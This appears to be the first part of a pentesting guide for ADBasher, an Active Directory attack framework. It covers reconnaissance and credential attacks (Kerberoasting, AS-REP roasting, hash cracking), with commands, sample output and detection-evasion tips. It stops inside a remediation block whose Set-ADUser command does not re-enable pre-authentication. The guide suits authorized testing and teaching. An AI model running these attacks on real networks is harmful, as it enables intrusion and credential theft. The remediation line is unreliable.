<!--
Title: Active Directory Penetration Testing with ADBasher
Author: ADBasher Framework Team
Version: 1.0
Last Updated: 2025-12-12
Target Audience: Penetration Testers, Red Team Operators
Prerequisites: Basic AD knowledge, Linux proficiency, Python 3.10+
-->

# Active Directory Penetration Testing with ADBasher

## Document Information

**Version:** 1.0  
**Last Updated:** December 12, 2025  
**Target Audience:** Penetration Testers, Red Team Operators, Security Consultants  
**Prerequisites:** Basic Active Directory knowledge, Linux command line proficiency, understanding of network protocols

---

## Table of Contents

- [Active Directory Penetration Testing with ADBasher](#active-directory-penetration-testing-with-adbasher)
  - [Document Information](#document-information)
  - [Table of Contents](#table-of-contents)
  - [Table of Contents](#table-of-contents-1)
  - [1. Introduction](#1-introduction)
    - [Why ADBasher?](#why-adbasher)
    - [1.1 Prerequisites and Environment Setup](#11-prerequisites-and-environment-setup)
      - [System Requirements](#system-requirements)
      - [Installing ADBasher](#installing-adbasher)
      - [Required External Tools](#required-external-tools)
      - [Environment Configuration](#environment-configuration)
      - [Pre-Engagement Setup](#pre-engagement-setup)
      - [Session Management](#session-management)
  - [2. Reconnaissance and Information Gathering](#2-reconnaissance-and-information-gathering)
    - [2.1 Passive Enumeration](#21-passive-enumeration)
      - [DNS Reconnaissance](#dns-reconnaissance)
      - [Open Source Intelligence (OSINT)](#open-source-intelligence-osint)
    - [2.2 Active Directory Discovery](#22-active-directory-discovery)
      - [LDAP Anonymous Bind](#ldap-anonymous-bind)
      - [SMB Null Session Enumeration](#smb-null-session-enumeration)
    - [2.3 Network Topology Mapping](#23-network-topology-mapping)
  - [3. Enumeration Techniques](#3-enumeration-techniques)
    - [3.1 User and Group Enumeration](#31-user-and-group-enumeration)
      - [With Valid Credentials](#with-valid-credentials)
    - [3.2 Computer and Service Account Discovery](#32-computer-and-service-account-discovery)
    - [3.3 Trust Relationships and Forest Mapping](#33-trust-relationships-and-forest-mapping)
    - [3.4 Identifying High-Value Targets](#34-identifying-high-value-targets)
  - [4. Credential Access and Harvesting](#4-credential-access-and-harvesting)
    - [4.1 Kerberoasting](#41-kerberoasting)
    - [4.2 AS-REP Roasting](#42-as-rep-roasting)
    - [4.3 Password Spraying](#43-password-spraying)
    - [4.4 NTLM Relay Attacks](#44-ntlm-relay-attacks)

---

> [!NOTE] > **Document Structure:** This guide is split into multiple files for better manageability. Sections 5-10 are located in `/docs/sections/`. See the complete table of contents below for navigation links.

---

## Table of Contents

**This Document (Main Guide):**

- [Active Directory Penetration Testing with ADBasher](#active-directory-penetration-testing-with-adbasher)
  - [Document Information](#document-information)
  - [Table of Contents](#table-of-contents)
  - [Table of Contents](#table-of-contents-1)
  - [1. Introduction](#1-introduction)
    - [Why ADBasher?](#why-adbasher)
    - [1.1 Prerequisites and Environment Setup](#11-prerequisites-and-environment-setup)
      - [System Requirements](#system-requirements)
      - [Installing ADBasher](#installing-adbasher)
      - [Required External Tools](#required-external-tools)
      - [Environment Configuration](#environment-configuration)
      - [Pre-Engagement Setup](#pre-engagement-setup)
      - [Session Management](#session-management)
  - [2. Reconnaissance and Information Gathering](#2-reconnaissance-and-information-gathering)
    - [2.1 Passive Enumeration](#21-passive-enumeration)
      - [DNS Reconnaissance](#dns-reconnaissance)
      - [Open Source Intelligence (OSINT)](#open-source-intelligence-osint)
    - [2.2 Active Directory Discovery](#22-active-directory-discovery)
      - [LDAP Anonymous Bind](#ldap-anonymous-bind)
      - [SMB Null Session Enumeration](#smb-null-session-enumeration)
    - [2.3 Network Topology Mapping](#23-network-topology-mapping)
  - [3. Enumeration Techniques](#3-enumeration-techniques)
    - [3.1 User and Group Enumeration](#31-user-and-group-enumeration)
      - [With Valid Credentials](#with-valid-credentials)
    - [3.2 Computer and Service Account Discovery](#32-computer-and-service-account-discovery)
    - [3.3 Trust Relationships and Forest Mapping](#33-trust-relationships-and-forest-mapping)
    - [3.4 Identifying High-Value Targets](#34-identifying-high-value-targets)
  - [4. Credential Access and Harvesting](#4-credential-access-and-harvesting)
    - [4.1 Kerberoasting](#41-kerberoasting)
    - [4.2 AS-REP Roasting](#42-as-rep-roasting)
    - [4.3 Password Spraying](#43-password-spraying)
    - [4.4 NTLM Relay Attacks](#44-ntlm-relay-attacks)

**Additional Section Files:**

5. [Privilege Escalation Paths](sections/05_privilege_escalation.md)

   - 5.1 Exploiting Misconfigurations
   - 5.2 ACL Abuse Techniques
   - 5.3 GPO Manipulation
   - 5.4 Delegation Attacks

6. [Lateral Movement](sections/06_lateral_movement.md)

   - 6.1 Pass-the-Hash and Pass-the-Ticket
   - 6.2 Remote Code Execution Methods
   - 6.3 Session Hijacking
   - 6.4 Golden and Silver Ticket Attacks

7. [Persistence Mechanisms](sections/07_persistence.md)

   - 7.1 Backdoor Accounts
   - 7.2 Skeleton Keys and Directory Replication
   - 7.3 AdminSDHolder Abuse

8. [Case Studies](sections/08_case_studies.md)

   - 8.1 Real-World Penetration Test Scenario
   - 8.2 Lessons Learned and Common Pitfalls

9. [Conclusion](sections/09_conclusion.md)

   - 9.1 Key Takeaways
   - 9.2 Further Resources

10. [Appendices](sections/10_appendices.md)
    - 10.1 Pre-Engagement Checklist
    - 10.2 Post-Engagement Checklist
    - 10.3 ADBasher Command Reference:

## 1. Introduction

Active Directory (AD) is the backbone of enterprise authentication and authorization in most corporate environments. As a penetration tester, understanding how to systematically compromise AD infrastructure is essential. ADBasher is a comprehensive, automated framework designed to streamline the entire AD penetration testing lifecycle, from initial reconnaissance to persistence establishment.

This guide provides practical, hands-on instruction for conducting professional AD penetration tests using ADBasher. Each section includes concrete commands, expected outputs, success criteria, and operational security (OPSEC) considerations.

> [!IMPORTANT] > **Legal Authorization Required:** This guide is for authorized penetration testing only. Unauthorized access to computer systems is illegal. Always ensure you have written permission and a clearly defined scope of work before conducting any testing.

### Why ADBasher?

**Manual vs Automated Comparison:**

| Aspect                   | Manual Testing          | ADBasher Automation           |
| ------------------------ | ----------------------- | ----------------------------- |
| **Time to Domain Admin** | 4-8 hours               | 30-90 minutes                 |
| **Coverage**             | Depends on tester skill | Consistent 40+ techniques     |
| **Documentation**        | Manual note-taking      | Automatic database logging    |
| **Credential Cascading** | Manual iteration        | Automatic re-testing          |
| **Reporting**            | Hours of manual work    | Instant HTML/Markdown reports |

### 1.1 Prerequisites and Environment Setup

#### System Requirements

**Recommended Operating System:**

- Kali Linux 2024.x (primary)
- Parrot Security OS 5.x
- Ubuntu 22.04+ with security tooling

**Hardware Specifications:**

- CPU: 4+ cores
- RAM: 8GB minimum (16GB recommended)
- Storage: 50GB free space
- Network: Direct access to target AD environment

#### Installing ADBasher

**Step 1: Clone the Repository**

```bash
# Clone with submodules
git clone --recurse-submodules https://github.com/yourusername/ADBasher.git
cd ADBasher

# Verify repository structure
ls -la
# Expected: core/, 1 nocreds/, 3 nopass/, 6 validcreds/, etc.
```

**Step 2: Automated Installation**

```bash
# Run the installation script
sudo ./install.sh

# The script will:
# - Install system dependencies (crackmapexec, impacket-scripts)
# - Install Python dependencies from requirements.txt
# - Make all scripts executable
# - Verify tool availability
```

**Expected Output:**

```
[+] Installing system packages...
[+] Installing Python dependencies...
[+] Setting executable permissions...
[+] Verifying tool installation...
    ✓ crackmapexec found
    ✓ secretsdump.py found
    ✓ GetUserSPNs.py found
[+] ADBasher installation complete!
```

**Step 3: Verification**

```bash
# Test core modules
python3 -c "from core import database, logger, orchestrator; print('✓ Core OK')"

# Run syntax validation
python3 tests/validate_syntax.py

# Check ADBasher help
./adbasher.py --help
```

> [!TIP] > **Pro Tip:** Create a dedicated virtual environment for ADBasher to avoid Python dependency conflicts: `python3 -m venv adbasher-venv && source adbasher-venv/bin/activate`

#### Required External Tools

ADBasher integrates with industry-standard tools. Ensure these are installed:

```bash
# CrackMapExec (CME) - Multi-protocol authentication testing
sudo apt install crackmapexec -y
crackmapexec --version  # Should be 5.4.0+

# Impacket Suite - Python network protocol implementations
sudo apt install impacket-scripts -y
which secretsdump.py GetUserSPNs.py GetNPUsers.py

# BloodHound (Optional but recommended)
sudo apt install bloodhound -y

# Certipy (For AD CS attacks)
pip3 install certipy-ad
certipy -h
```

#### Environment Configuration

**Edit Configuration File:**

```bash
# Open the global configuration
nano core/config.yaml
```

**Key Configuration Parameters:**

```yaml
global:
  session_dir: ~/.adbasher/sessions # Session artifacts location
  log_level: INFO # DEBUG for verbose, WARNING for quiet

scope:
  target_domains:
    - "contoso.local" # Primary target domain
  exclude_ips:
    - "192.168.1.1" # Gateway/exclusions

evasion:
  mode: "standard" # standard | stealth | aggressive
  jitter_min: 5 # Min delay between attacks (seconds)
  jitter_max: 30 # Max delay between attacks
  work_hours_only: false # Restrict to 9 AM - 5 PM local time
```

> [!WARNING] > **OPSEC Consideration:** Set `work_hours_only: true` and `mode: stealth` for red team engagements where detection avoidance is critical. This significantly increases test duration but reduces detection likelihood.

#### Pre-Engagement Setup

**Authorization Documentation:**

Before launching ADBasher, ensure you have:

1. **Signed Scope of Work (SOW)** - Defines authorized targets and methods
2. **Rules of Engagement (ROE)** - Specifies restricted actions and hours
3. **Emergency Contacts** - Client SOC/incident response team contacts
4. **Data Handling Agreement** - Procedures for sensitive data discovered

**Network Positioning:**

```bash
# Verify network access to target
ping -c 3 <DC_IP>

# Ensure you can resolve domain DNS
nslookup contoso.local <DC_IP>

# Test basic connectivity
nc -zv <DC_IP> 389  # LDAP
nc -zv <DC_IP> 445  # SMB
nc -zv <DC_IP> 88   # Kerberos
```

#### Session Management

ADBasher uses session-based artifact storage:

```text
~/.adbasher/sessions/<SESSION_ID>/
├── session.db           # SQLite database with all findings
├── session_<ID>.log     # Human-readable logs
├── session_<ID>.json.log # SIEM-compatible JSON logs
├── report.html          # Interactive HTML report
├── report.md            # Markdown report
└── bloodhound_data/     # BloodHound collection ZIPs
```

**Success Criteria for Environment Setup:**

- [ ] ADBasher core modules import without errors
- [ ] All external tools (CME, Impacket) are accessible
- [ ] Configuration file reflects correct target domains
- [ ] Network connectivity verified to target DCs
- [ ] Authorization documentation secured

---

## 2. Reconnaissance and Information Gathering

Reconnaissance is the foundation of any successful AD penetration test. This phase identifies domain controllers, gathers user/computer lists, and maps the network topology—all without valid credentials.

### 2.1 Passive Enumeration

Passive enumeration collects information without directly interacting with target systems, minimizing detection risk.

#### DNS Reconnaissance

**Technique:** Query public DNS records to identify domain infrastructure.

**ADBasher Command:**

```bash
# Discover domain controllers via DNS SRV records
./adbasher.py --target contoso.local

# Behind the scenes, ADBasher executes:
python3 "1 nocreds/discover_domain.py" \
  --session-dir ~/.adbasher/sessions/<SESSION_ID> \
  --domain contoso.local
```

**Manual Equivalent (for understanding):**

```bash
# Query LDAP SRV records
nslookup -type=SRV _ldap._tcp.dc._msdcs.contoso.local

# Query Kerberos SRV records
nslookup -type=SRV _kerberos._tcp.dc._msdcs.contoso.local

# Query Global Catalog
nslookup -type=SRV _ldap._tcp.gc._msdcs.contoso.local
```

**Expected Output:**

```
[INFO] Querying DNS SRV records for contoso.local
[+] Found DC: DC01.contoso.local (192.168.10.10)
[+] Found DC: DC02.contoso.local (192.168.10.11)
[+] Stored 2 domain controllers in database
```

**Success Metrics:**

- At least 1 domain controller IP identified
- DC hostname and domain information stored in session database

**Next Steps:**

- Validate DC connectivity with ping/port checks
- Proceed to active LDAP enumeration

**OPSEC Rating:** **Low** - DNS queries are normal network traffic and rarely trigger alerts.

#### Open Source Intelligence (OSINT)

**Technique:** Gather information from public sources before active scanning.

**Manual OSINT Commands:**

```bash
# Search for leaked credentials (check HaveIBeenPwned, Dehashed)
# Note: Use responsibly and legally

# Identify email format via LinkedIn
# Format often reveals username convention (first.last@contoso.com)

# Certificate Transparency logs
curl "https://crt.sh/?q=%.contoso.local&output=json" | jq .

# Shodan/Censys for exposed services
# shodan search "org:Contoso"
```

> [!TIP] > **Efficiency Tip:** Create a wordlist of discovered usernames during OSINT. ADBasher's password spray module can consume custom username lists via the session database.

### 2.2 Active Directory Discovery

Active discovery directly queries AD services to enumerate users, groups, and computers.

#### LDAP Anonymous Bind

**Technique:** Attempt anonymous LDAP connections to extract directory information.

**ADBasher Auto-Execution:**

```bash
# ADBasher automatically attempts LDAP anonymous bind after DC discovery
# Manual invocation:
python3 "1 nocreds/ldap_anonymous_bind.py" \
  --session-dir ~/.adbasher/sessions/<SESSION_ID> \
  --target-ip 192.168.10.10
```

**Expected Output (Success Case):**

```
[INFO] Attempting LDAP anonymous bind to 192.168.10.10
[+] Anonymous bind successful!
[+] Enumerating users...
[+] Found 487 user accounts
[+] Found 52 groups
[+] Found 124 computer accounts
[+] Stored results in session database
```

**Expected Output (Blocked Case):**

```
[INFO] Attempting LDAP anonymous bind to 192.168.10.10
[-] Anonymous bind rejected (strongerAuthRequired)
[!] LDAP anonymous enumeration not possible
```

**Success Metrics:**

- Anonymous bind accepted: CRITICAL finding (should be disabled)
- User accounts enumerated: Immediate password spray candidates
- Computer accounts enumerated: Lateral movement targets

**Interpreting Results:**

If anonymous LDAP succeeds, the target has a significant misconfiguration. Modern AD deployments should block this.

**Database Query to View Results:**

```bash
# Open session database
sqlite3 ~/.adbasher/sessions/<SESSION_ID>/session.db

# Query enumerated users
SELECT username, description FROM users LIMIT 10;

# Query computers
SELECT hostname, operating_system FROM computers;
```

**Next Steps:**

- If successful: Extract usernames for password spraying
- If blocked: Proceed to SMB null session attempts
- Document finding in final report as HIGH severity

**OPSEC Rating:** **Medium** - LDAP queries generate logs but are common in normal AD environments.

#### SMB Null Session Enumeration

**Technique:** Establish unauthenticated SMB connection to enumerate shares and users.

**ADBasher Auto-Execution:**

```bash
python3 "1 nocreds/smb_null_enum.py" \
  --session-dir ~/.adbasher/sessions/<SESSION_ID> \
  --target-ip 192.168.10.10
```

**Manual Equivalent:**

```bash
# Using enum4linux-ng
enum4linux-ng -A -C 192.168.10.10

# Using CrackMapExec
crackmapexec smb 192.168.10.10 --shares -u '' -p ''

# Using rpcclient
rpcclient -U "" -N 192.168.10.10
rpcclient $> enumdomusers
rpcclient $> enumdomgroups
```

**Expected Output (Blocked - Most Common):**

```
[INFO] Attempting SMB null session on 192.168.10.10
[-] STATUS_ACCESS_DENIED
[!] SMB null sessions blocked (expected in modern AD)
```

**Expected Output (Vulnerable):**

```
[INFO] Attempting SMB null session on 192.168.10.10
[+] Null session established!
[+] Enumerating users via RPC...
[+] Retrieved 487 users
[+] Enumerating shares...
[+] Readable shares: IPC$, NETLOGON
```

**Common Errors and Troubleshooting:**

| Error                  | Cause                 | Solution                           |
| ---------------------- | --------------------- | ---------------------------------- |
| `STATUS_ACCESS_DENIED` | Null sessions blocked | Expected, proceed to other methods |
| `Connection timeout`   | Firewall blocking SMB | Verify port 445 is open            |
| `NT_STATUS_IO_TIMEOUT` | Network instability   | Retry with longer timeout          |

**Next Steps:**

- If successful: Report as CRITICAL misconfiguration
- Extract username list for credential attacks
- If blocked: Continue with other enumeration methods

**OPSEC Rating:** **Medium-High** - SMB null session attempts may trigger IDS alerts on well-monitored networks.

### 2.3 Network Topology Mapping

**Technique:** Scan network ranges to identify all AD-joined systems.

**ADBasher Command:**

```bash
# Scan entire subnet
./adbasher.py --target 192.168.10.0/24 contoso.local

# Behind the scenes:
python3 "1 nocreds/adnetscan_db.py" \
  --session-dir ~/.adbasher/sessions/<SESSION_ID> \
  --target 192.168.10.0/24
```

**What ADnetscan Does:**

```
┌─────────────────────────────────────────┐
│         Network Scan Flow               │
├─────────────────────────────────────────┤
│ 1. Live Host Detection (ICMP/ARP)      │
│ 2. Port Scanning (445,135,139,389,88)  │
│ 3. SMB Version Detection                │
│ 4. NetBIOS Name Resolution              │
│ 5. Operating System Fingerprinting     │
│ 6. Store Results in Database            │
└─────────────────────────────────────────┘
```

**Expected Output:**

```
[INFO] Scanning 192.168.10.0/24 (254 potential hosts)
[+] Live hosts detected: 47
[+] SMB hosts found: 45
[+] Domain controllers: 2
[+] Windows servers: 12
[+] Windows workstations: 31
[+] Results stored in session database
```

**Visualizing Network Topology:**

```bash
# Query database for network map
sqlite3 ~/.adbasher/sessions/<SESSION_ID>/session.db << EOF
SELECT
  ip_address,
  hostname,
  operating_system,
  CASE WHEN is_dc = 1 THEN 'DC' ELSE 'Host' END as type
FROM targets
WHERE is_alive = 1
ORDER BY is_dc DESC, ip_address;
EOF
```

**Success Metrics:**

- All live hosts cataloged
- Domain controllers identified
- High-value targets flagged (SQL servers, Exchange, file servers)

**Next Steps:**

- Prioritize DCs and high-value servers
- Identify workstations for potential credential harvesting
- Map trust relationships (requires credentials)

**OPSEC Rating:** **Medium** - Network scanning generates logs in firewalls and SIEM. Use slow scan rates in stealth mode.

> [!CAUTION] > **Detection Risk:** Aggressive network scanning (all 65535 ports, fast scan rate) WILL trigger alerts in monitored environments. ADBasher's stealth mode randomizes timing and scans only essential ports (88, 135, 139, 389, 445, 636, 3268, 3389).

---

## 3. Enumeration Techniques

With initial reconnaissance complete and domain controllers identified, enumeration deepens our understanding of AD structure, user privileges, and attack paths.

### 3.1 User and Group Enumeration

**Objective:** Build comprehensive lists of domain users, groups, and their relationships.

#### With Valid Credentials

Once ADBasher discovers valid credentials (via password spray or AS-REP roasting), it automatically performs deep enumeration.

**ADBasher Auto-Execution:**

```bash
# BloodHound collection (automatic with valid creds)
python3 "6 validcreds/automated/bloodhound_collect.py" \
  --session-dir ~/.adbasher/sessions/<SESSION_ID> \
  --domain contoso.local \
  --dc-ip 192.168.10.10 \
  --username john.doe \
  --password Password123
```

**Manual BloodHound Collection:**

```bash
# Using bloodhound-python
bloodhound-python -d contoso.local -u john.doe -p 'Password123' \
  -dc dc01.contoso.local -c All --zip

# Using SharpHound (from Windows)
.\SharpHound.exe -c All --outputdirectory C:\temp
```

**Expected Output:**

```
[INFO] Starting BloodHound collection for contoso.local
[+] Resolving collection methods
[+] Collecting: Group Membership
[+] Collecting: Local Admin
[+] Collecting: Session Data
[+] Collecting: Trusts
[+] Collecting: ACLs
[+] Collecting: Container
[+] Collecting: GPO
[+] Collecting: ObjectProps
[+] Collection complete: 20241212_bloodhound.zip
[+] Nodes: 1,243 | Edges: 15,687
```

**Analyzing BloodHound Data:**

```bash
# Start Neo4j database
sudo neo4j start

# Upload ZIP to BloodHound GUI
# Navigate to http://localhost:7474
# Import the ZIP file

# Key queries to run in BloodHound:
# 1. "Find Shortest Path to Domain Admins from Owned Principals"
# 2. "Find Computers where Domain Users can RDP"
# 3. "Find AS-REP Roastable Users"
# 4. "Find All Kerberoastable Users"
```

**Success Metrics:**

- BloodHound data collected and imported
- Attack paths identified to Domain Admins
- High-value users identified (SQL admins, Exchange admins)

**Next Steps Based on Findings:**

| BloodHound Finding                   | Action                              |
| ------------------------------------ | ----------------------------------- |
| User has GenericAll on Domain Admins | Exploit ACL to add user to DA group |
| Kerberoastable accounts found        | Extract TGS tickets, crack offline  |
| Unconstrained delegation on server   | Monitor for high-value TGTs         |
| Password never expires on admin      | Target for password spray           |

**OPSEC Rating:** **Low-Medium** - BloodHound queries mimic normal LDAP traffic but generate high volume of requests.

### 3.2 Computer and Service Account Discovery

**Objective:** Identify all computers and service accounts for lateral movement and Kerberoasting.

**ADBasher Database Query:**

```bash
# From session database
sqlite3 ~/.adbasher/sessions/<SESSION_ID>/session.db << EOF

-- Query all domain computers
SELECT hostname, operating_system, ip_address
FROM targets
WHERE is_alive = 1
ORDER BY operating_system;

-- Identify potential targets by OS
SELECT
  operating_system,
  COUNT(*) as count
FROM targets
WHERE is_alive = 1
GROUP BY operating_system;

EOF
```

**Identifying Service Accounts:**

Service accounts often have Service Principal Names (SPNs) and are prime Kerberoasting targets.

**Manual SPN Enumeration:**

```bash
# Using Impacket GetUserSPNs.py
GetUserSPNs.py -request -dc-ip 192.168.10.10 contoso.local/john.doe:Password123

# Output shows service accounts with SPNs:
# ServicePrincipalName              Name       MemberOf
# MSSQLSvc/SQL01.contoso.local:1433 svc_sql    CN=SQLAdmins,OU=Groups,DC=contoso,DC=local
```

**Expected Database Entries:**

```
[+] Service account discovered: svc_sql
[+] SPN: MSSQLSvc/SQL01.contoso.local:1433
[+] Member of: SQLAdmins (potential high privilege)
```

**Success Metrics:**

- All computers cataloged with OS versions
- Service accounts with SPNs identified
- High-value service accounts prioritized (SQL, Exchange, SharePoint)

**OPSEC Rating:** **Low** - Querying SPNs is normal AD behavior.

### 3.3 Trust Relationships and Forest Mapping

**Objective:** Identify cross-domain and forest trusts for potential privilege escalation across boundaries.

**Manual Trust Enumeration:**

```bash
# Using PowerView (requires PowerShell access)
Get-DomainTrust -Domain contoso.local

# Using nltest (from Windows)
nltest /domain_trusts /all_trusts

# Using ldapsearch (Linux)
ldapsearch -x -H ldap://192.168.10.10 -b "CN=System,DC=contoso,DC=local" \
  "(objectClass=trustedDomain)" trustPartner trustDirection trustType
```

**BloodHound Trust Visualization:**

BloodHound automatically maps trusts. Query: "Map Domain Trusts"

**Trust Types Explained:**

| Trust Type   | Direction                | Implication                                |
| ------------ | ------------------------ | ------------------------------------------ |
| Parent-Child | Two-way (transitive)     | Full trust, privilege escalation possible  |
| External     | One-way (non-transitive) | Limited access, focus on trusted direction |
| Forest       | Two-way (transitive)     | Cross-forest attacks possible              |
| Shortcut     | One-way (transitive)     | Optimization, follows existing trust paths |

**Exploitation Scenarios:**

```
Scenario: contoso.local trusts partner.local (one-way, inbound)
Attack: Compromise admin in contoso.local → access resources in partner.local
```

**Success Metrics:**

- All trust relationships mapped
- Trust directions understood
- Cross-domain attack paths identified in BloodHound

**Next Steps:**

- If outbound trust exists: Focus on compromising that domain first
- If inbound trust exists: Pivot to trusted domain after local compromise

**OPSEC Rating:** **Low** - Trust enumeration is normal AD administrative activity.

### 3.4 Identifying High-Value Targets

**Objective:** Prioritize targets based on business impact and privilege escalation potential.

**High-Value Target Categories:**

1. **Domain Controllers** - Full domain compromise
2. **Exchange Servers** - Email access, credential harvesting
3. **SQL Servers** - Database access, often linked to service accounts
4. **File Servers** - Sensitive document access
5. **Jump Boxes/Bastion Hosts** - Admin credential caching
6. **Certificate Authority Servers** - AD CS exploitation

**ADBasher Automatic Prioritization:**

```bash
# Query high-value targets from database
sqlite3 ~/.adbasher/sessions/<SESSION_ID>/session.db << EOF

-- Find servers (likely higher privilege)
SELECT ip_address, hostname, operating_system
FROM targets
WHERE operating_system LIKE '%Server%'
  AND is_alive = 1
ORDER BY is_dc DESC;

EOF
```

**Manual Identification:**

```bash
# Search for specific server roles via LDAP
ldapsearch -x -H ldap://dc01.contoso.local -D "john.doe@contoso.local" \
  -w 'Password123' -b "DC=contoso,DC=local" \
  "(servicePrincipalName=*EXCHANGE*)" dNSHostName

# Identify SQL servers
ldapsearch -x -H ldap://dc01.contoso.local -D "john.doe@contoso.local" \
  -w 'Password123' -b "DC=contoso,DC=local" \
  "(servicePrincipalName=MSSQLSvc*)" dNSHostName
```

**Decision Tree for Target Selection:**

```
┌─────────────────────────────────────┐
│ Do you have valid credentials?     │
└──────────┬──────────────────────────┘
           │
           ├─ NO  → Focus on credential attacks (§4)
           │
           └─ YES → Continue
                    │
                    ├─ Are credentials LOCAL ADMIN anywhere?
                    │  └─ YES → Prioritize lateral movement (§6)
                    │  └─ NO  → Continue
                    │
                    └─ Are credentials DOMAIN ADMIN?
                       └─ YES → Full compromise, establish persistence (§7)
                       └─ NO  → Focus on privilege escalation (§5)
```

**Success Metrics:**

- High-value targets identified and prioritized
- Attack paths to critical systems mapped
- Target selection aligned with engagement objectives

**Next Steps:**

- Develop attack paths to each high-value target
- Prioritize based on likelihood of success and business impact

---

## 4. Credential Access and Harvesting

Credential harvesting is often the pivotal phase in AD penetration testing. This section covers techniques to obtain valid credentials without prior authentication.

### 4.1 Kerberoasting

**Objective:** Extract Kerberos TGS tickets for service accounts and crack them offline to retrieve plaintext passwords.

**Attack Flow:**

```
┌──────────────────────────────────────────────────────────┐
│            Kerberoasting Attack Flow                     │
├──────────────────────────────────────────────────────────┤
│ 1. Enumerate SPNs (requires any domain user)            │
│ 2. Request TGS tickets for service accounts             │
│ 3. Extract tickets (RC4 or AES encrypted)               │
│ 4. Crack offline with Hashcat/John                      │
│ 5. Use cracked password for privilege escalation        │
└──────────────────────────────────────────────────────────┘
```

**ADBasher Auto-Execution:**

```bash
# Automatic after valid credentials are discovered
python3 "3 nopass/automated/kerberoast.py" \
  --session-dir ~/.adbasher/sessions/<SESSION_ID> \
  --domain contoso.local \
  --dc-ip 192.168.10.10
```

**Manual Kerberoasting:**

```bash
# Using Impacket GetUserSPNs.py
GetUserSPNs.py -request -dc-ip 192.168.10.10 \
  contoso.local/john.doe:Password123 \
  -outputfile kerberoast_hashes.txt

# Expected output:
# ServicePrincipalName              Name      MemberOf
# MSSQLSvc/SQL01.contoso.local:1433 svc_sql   CN=SQLAdmins...
# $krb5tgs$23$*svc_sql$CONTOSO.LOCAL$MSSQLSvc/SQL01...[encrypted ticket]
```

**Cracking Kerberoast Hashes:**

```bash
# Using Hashcat (GPU acceleration recommended)
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt \
  --force

# Using John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt kerberoast_hashes.txt

# Expected cracking time (depends on password strength):
# Weak password (Password123): Seconds to minutes
# Medium password (Summer2024!): Hours to days
# Strong password (64+ chars random): Infeasible
```

**Expected ADBasher Output:**

```
[INFO] Starting Kerberoasting attack
[+] Requesting TGS tickets for service accounts
[+] Found 3 kerberoastable accounts:
    - svc_sql (MSSQLSvc/SQL01.contoso.local:1433)
    - svc_web (HTTP/WEBAPP01.contoso.local)
    - svc_backup (CIFS/BACKUP01.contoso.local)
[+] Tickets saved to: kerberoast_tickets.txt
[!] Attempting offline crack with common passwords
[+] CRACKED: svc_sql:Welcome2024!
[+] Credential stored in database (username: svc_sql, password: Welcome2024!)
```

**Success Metrics:**

- TGS tickets extracted for all service accounts with SPNs
- At least one ticket cracked (ideal scenario)
- Cracked credential added to ADBasher database for cascading

**Interpreting Results:**

| Scenario                 | Meaning                              | Next Steps                              |
| ------------------------ | ------------------------------------ | --------------------------------------- |
| 0 SPNs found             | No service accounts or well-hardened | Move to other credential attacks        |
| SPNs found, none cracked | Strong passwords on service accounts | Note as positive security finding       |
| 1+ tickets cracked       | Credential compromise achieved       | Check admin privileges, cascade attacks |

**Common Errors:**

```bash
# Error: KDC_ERR_ETYPE_NOSUPP
# Cause: Only AES encryption enabled, RC4 disabled
# Solution: Request tickets with AES support
GetUserSPNs.py -request-user svc_sql -dc-ip 192.168.10.10 contoso.local/john.doe

# Error: Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN
# Cause: SPN doesn't exist or typo in service name
# Solution: Re-enumerate SPNs, verify spelling
```

**OPSEC Considerations:**

- **Detection Likelihood:** **Medium**
- **Indicators of Compromise (IOCs):**
  - Event ID 4769 (TGS Request) with unusual service ticket requests
  - High volume of TGS requests in short timeframe
  - TGS requests for dormant service accounts

**OPSEC Evasion Techniques:**

```bash
# Request tickets slowly over time
# ADBasher stealth mode adds jitter delays

# Request only high-value SPNs (not all)
# Reduces volume of Event ID 4769 logs

# Use AES encryption instead of RC4 (less suspicious)
GetUserSPNs.py -request -dc-ip 192.168.10.10 contoso.local/user:pass \
  -output-type aes256
```

**Next Steps:**

- Use cracked service account credentials for privilege escalation
- Check if service account has admin rights on any systems
- Review service account group memberships in BloodHound

---

### 4.2 AS-REP Roasting

**Objective:** Identify accounts with Kerberos pre-authentication disabled and extract crackable AS-REP hashes.

**Attack Prerequisites:** **NONE** - No valid credentials required!

**Attack Flow:**

```
┌────────────────────────────────────────────────────────┐
│          AS-REP Roasting Attack Flow                   │
├────────────────────────────────────────────────────────┤
│ 1. Enumerate users (from LDAP anon or OSINT)          │
│ 2. Request AS-REP for each user                        │
│ 3. If pre-auth disabled, DC returns encrypted AS-REP   │
│ 4. Crack AS-REP offline (encrypted with user password) │
│ 5. Use cracked password for authentication             │
└────────────────────────────────────────────────────────┘
```

**ADBasher Auto-Execution:**

```bash
# Runs automatically during credential attack phase
python3 "3 nopass/automated/asreproast.py" \
  --session-dir ~/.adbasher/sessions/<SESSION_ID> \
  --domain contoso.local \
  --dc-ip 192.168.10.10
```

**Manual AS-REP Roasting:**

```bash
# Using Impacket GetNPUsers.py (no credentials needed)
GetNPUsers.py contoso.local/ -dc-ip 192.168.10.10 -usersfile users.txt \
  -format hashcat -outputfile asrep_hashes.txt

# With valid credentials (more reliable enumeration)
GetNPUsers.py -request -dc-ip 192.168.10.10 \
  contoso.local/john.doe:Password123

# Expected output:
# $krb5asrep$23$vulnerable.user@CONTOSO.LOCAL:[encrypted_hash]
```

**Cracking AS-REP Hashes:**

```bash
# Using Hashcat
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt

# Using John
john --wordlist=/usr/share/wordlists/rockyou.txt asrep_hashes.txt
```

**Expected ADBasher Output:**

```
[INFO] Starting AS-REP Roasting attack
[+] Testing 487 users for pre-authentication disabled
[+] Vulnerable accounts found: 2
    - legacy.admin (PREAUTH_DISABLED)
    - test.user (PREAUTH_DISABLED)
[+] AS-REP hashes extracted
[!] Attempting offline crack
[+] CRACKED: legacy.admin:OldPassword99
[+] Credential stored in database
```

**Success Metrics:**

- Accounts with PREAUTH_DISABLED identified
- AS-REP hashes extracted
- Hashes cracked (if weak passwords exist)

**Why This Attack Works:**

Kerberos pre-authentication is a security feature that prevents offline password attacks. When disabled (often for legacy compatibility), the KDC responds with an AS-REP message encrypted with the user's password hash, which can be cracked offline.

**Remediation Advice (for reporting):**

```
Finding: Kerberos Pre-Authentication Disabled
Severity: HIGH
Affected Accounts: legacy.admin, test.user

Recommendation:
1. Enable Kerberos pre-authentication for all accounts:
   Set-ADUser -Identity "legacy.admin" -KerberosEncryptionType AES256

